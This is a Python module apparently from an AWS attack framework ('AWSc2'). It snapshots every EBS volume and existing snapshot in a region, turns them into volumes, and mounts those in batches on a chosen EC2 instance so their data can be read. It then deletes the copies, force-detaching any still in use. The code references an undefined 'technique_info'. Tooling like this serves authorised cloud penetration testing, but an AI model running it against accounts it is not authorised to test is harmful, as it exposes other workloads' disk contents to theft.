#!/usr/bin/env python3
import datetime

"""Module for ebs_snapshot_explorer"""
import argparse
from copy import deepcopy
import json
from pathlib import Path

from botocore.exceptions import ClientError

SET_COUNT = 10


def load_volumes(awsattack, client, instance_id, volume_ids):
    """Loads volumes on an instance.

    Args:
        client (boto3.client): client to interact with AWS
        print (func): Overwritten built-in print function
        input (func): Overwritten built-in input function
        instance_id (str): instance_id to attach volumes to
        volume_ids (list): list of volume_ids to attach to the instance.
    Returns:
        bool: True if all volumes were successfully attached.
    """

    # load volume set
    set_index = 0

    while set_index < len(volume_ids):
        current_volume_set = volume_ids[set_index:set_index + SET_COUNT]
        waiter = client.get_waiter('volume_available')
        waiter.wait(VolumeIds=current_volume_set)
        attached = modify_volume_list(
            awsattack, client, 'attach_volume', instance_id, current_volume_set
        )
        if not attached:
            awsattack.print(' Volume attachment failed')
            awsattack.print(' Exiting...')
            running = False

        while True:
            response = awsattack.input('    Load next set of volumes? (y/n) ')
            if response.lower() == 'y':
                running = True
                break
            elif response.lower() == 'n':
                running = False
                break

        detached = modify_volume_list(
            awsattack, client, 'detach_volume', instance_id, current_volume_set
        )
        if not detached:
            awsattack.print(' Volume detachment failed')
            awsattack.print(' Exiting...')
            running = False
        waiter.wait(VolumeIds=current_volume_set)
        set_index += SET_COUNT
        if not running:
            break
    cleanup(client)
    return True


def modify_volume_list(awsattack, client, func, instance_id, volume_id_list):
    """Helper function to load volumes on an instance to not overload the
    instance.

    Args:
        client (boto3.client): client to interact with AWS
        print (func): Overwritten built-in print function
        func (str): Function sname to modify_volume_list
        instance_id (str): instance_id to attach volumes to
        volume_ids (list): list of volume_ids to (de)attach to the instance.
    Returns:
        bool: True if the volumes were successfully modified.
    """
    available_devices_iterator = iter(get_valid_devices(awsattack, instance_id))
    for volume_id in volume_id_list:
        try:
            kwargs = {
                'InstanceId': instance_id,
                'VolumeId': volume_id
            }
            if func == 'attach_volume':
                kwargs['Device'] = next(available_devices_iterator)
            caller = getattr(client, func)
            caller(**kwargs)
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'UnauthorizedOperation':
                awsattack.print('  FAILURE MISSING AWS PERMISSIONS')
            else:
                awsattack.print(error)
            return False
    return True


def get_valid_devices(awsattack, instance_id):
    """Returns the next device mapping available

    Args:
        client (boto3.client): Client that gets the current block device mappings
        instance (str): InstanceId to get curretn block device mappings
    Returns:
        str: Returns next mapping in form of /dev/xvd[base], otherwise /dev/xvdzz

    """
    instance = [instance for instance in get_instances(awsattack) if instance['InstanceId'] == instance_id]
    mappings = instance[0]['BlockDeviceMappings']
    current_mappings = [device['DeviceName'] for device in mappings]
    last_mapping = sorted(current_mappings)[-1]
    available_devices = [get_valid_device(last_mapping)]
    for _ in range(SET_COUNT):
        available_devices.append(get_valid_device(available_devices[-1]))
    return available_devices


def get_valid_device(previous_device):
    """Helper function that returns the next device given a previous device"""
    return previous_device[:-1] + next_char(previous_device[-1])


def next_char(char):
    """Gets the next sequential character

    Args:
        char (str): Character to increment
    Returns:
        str: Incremented passed char
    """
    out = chr(ord(char) + 1)
    return out if out != '{' else 'aa'


def get_instances(awsattack):
    """Returns snapshots given an AWS region
    Args:
        awsattack (Main): Reference to AWSc2
    Returns:
        list: List of Instances.
    """
    ec2_data = deepcopy(awsattack.get_active_session().EC2)
    if 'Instances' not in ec2_data:
        fields = ['EC2', 'Instances']
        module = technique_info['prerequisite_modules'][0]
        args = None
        fetched_ec2_instances = awsattack.fetch_data(fields, module, args)
        if fetched_ec2_instances is False:
            return []
        instance_data = deepcopy(awsattack.get_active_session().EC2)
        return instance_data['Instances']
    return ec2_data['Instances']


def get_snapshots(awsattack):
    """Returns snapshots given an AWS region
    Args:
        awsattack (Main): Reference to AWSc2
    Returns:
        list: List of Snapshots.
    """
    ec2_data = deepcopy(awsattack.get_active_session().EC2)
    if 'Snapshots' not in ec2_data or not ec2_data['Snapshots']:
        fields = ['EC2', 'Snapshots']
        module = technique_info['prerequisite_modules'][1]
        args = None
        fetched_snapshots = awsattack.fetch_data(fields, module, args)
        if fetched_snapshots is False:
            return []
        snap_data = deepcopy(awsattack.get_active_session().EC2)
        return snap_data['Snapshots']
    return ec2_data['Snapshots']


def get_volumes(awsattack):
    """Returns volumes given an AWS region
    Args:
        awsattack (Main): Reference to AWSc2
    Returns:
        dict: Mapping regions to corresponding list of volume_ids.
    """
    ec2_data = deepcopy(awsattack.get_active_session().EC2)
    if 'Volumes' not in ec2_data or not ec2_data['Volumes']:
        awsattack.print('Fetching Volume data...')
        fields = ['EC2', 'Volumes']
        module = technique_info['prerequisite_modules'][1]
        args = '--vols'
        fetched_volumes = awsattack.fetch_data(fields, module, args)
        if fetched_volumes is False:
            return []
        vol_data = deepcopy(awsattack.get_active_session().EC2)
        return vol_data['Volumes']
    return ec2_data['Volumes']


def generate_volumes_from_snapshots(client, snapshots, zone):
    """Returns a list of generated volumes"""
    volume_ids = []
    waiter = client.get_waiter('snapshot_completed')
    waiter.wait(SnapshotIds=snapshots)
    for snapshot in snapshots:
        response = client.create_volume(SnapshotId=snapshot, AvailabilityZone=zone)
        volume_ids.append(response['VolumeId'])
    store_temp_data({'volumes': volume_ids})
    return volume_ids


def generate_snapshots_from_volumes(client, volume_ids):
    """Returns a list of generated snapshots from volumes"""
    snapshot_ids = []
    for volume in volume_ids:
        response = client.create_snapshot(VolumeId=volume)
        snapshot_ids.append(response['SnapshotId'])

    store_temp_data({'snapshots': snapshot_ids})
    return snapshot_ids


def delete_volumes(client, volumes):
    """Deletes a given list of volumes

    If the volume is in use, the volume is forcibly detached because this module
    only deals with temporary copies so data integrity is not a high priority when
    a volume is ready to be detatched. After the volume is forcibly detatched, the
    volume will be deleted after the detaching operation finishes.
    """
    failed_volumes = []
    for volume in volumes:
        try:
            client.delete_volume(VolumeId=volume)
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'VolumeInUse':
                client.detach_volume(
                    VolumeId=volume,
                    Force=True)
                waiter = client.get_waiter('volume_available')
                waiter.wait(VolumeIds=[volume])
                client.delete_volume(VolumeId=volume)
                continue
            failed_volumes.append(volume)
    return failed_volumes


def delete_snapshots(client, snapshots):
    """Deletes a given list of snapshots"""
    failed_snapshots = []
    for snapshot in snapshots:
        try:
            client.delete_snapshot(SnapshotId=snapshot)
        except ClientError:
            failed_snapshots.append(snapshot)
    return failed_snapshots


def cleanup(client):
    """Cleans up the temporary snapshots and volumes created during this
    modules execution
    """
    new_data = {}
    success = True
    temp_file = Path(__file__).parent / 'temp.json'
    if temp_file.is_file():
        with temp_file.open('r') as file:
            data = json.load(file)
            if 'snapshots' in data:
                new_data['snapshots'] = delete_snapshots(client, data['snapshots'])
            if 'volumes' in data:
                new_data['volumes'] = delete_volumes(client, data['volumes'])
        if 'volumes' in new_data and new_data['volumes']:
            print('  Failed to delete volumes: {}'.format(new_data['volumes']))
            success = False
        if 'snapshots' in new_data and new_data['snapshots']:
            print('  Failed to delete snapshots: {}'.format(new_data['snapshots']))
            success = False
        store_temp_data(new_data)
        if success:
            temp_file.unlink()
    return success


def store_temp_data(data):
    """Stores temporary data in a JSON file"""
    temp_file = Path(__file__).parent / 'temp.json'
    if temp_file.exists():
        with temp_file.open('r') as json_file:
            existing_data = json.load(json_file)
            data.update(existing_data)
    with temp_file.open('w+') as json_file:
        json.dump(data, json_file)


def main(args, awsattack):
    """Main module function, called from AWSc2"""
    summary_data = {}
    instance_id = args.instance_id
    zone = args.zone
    region = zone[:-1]
    client = awsattack.get_boto3_client('ec2', region)

    if not cleanup(client):
        awsattack.print('  Cleanup failed')
        return summary_data

    snapshots = [snap['SnapshotId'] for snap in get_snapshots(awsattack) if snap['Region'] == region]
    volumes = [vol['VolumeId'] for vol in get_volumes(awsattack) if vol['Region'] == region]
    summary_data.update({'snapshots': len(snapshots), 'volumes': len(volumes)})

    awsattack.print('  Attaching volumes...')
    temp_snaps = generate_snapshots_from_volumes(client, volumes)
    temp_volumes = generate_volumes_from_snapshots(client, temp_snaps, zone)
    load_volumes(awsattack, client, instance_id, temp_volumes)
    awsattack.print('  Finished attaching volumes...')

    awsattack.print('  Attaching volumes from existing snapshots...')
    temp_volumes = generate_volumes_from_snapshots(client, snapshots, zone)
    load_volumes(awsattack, client, instance_id, temp_volumes)
    awsattack.print('  Finished attaching existing snapshot volumes...')

    return summary_data


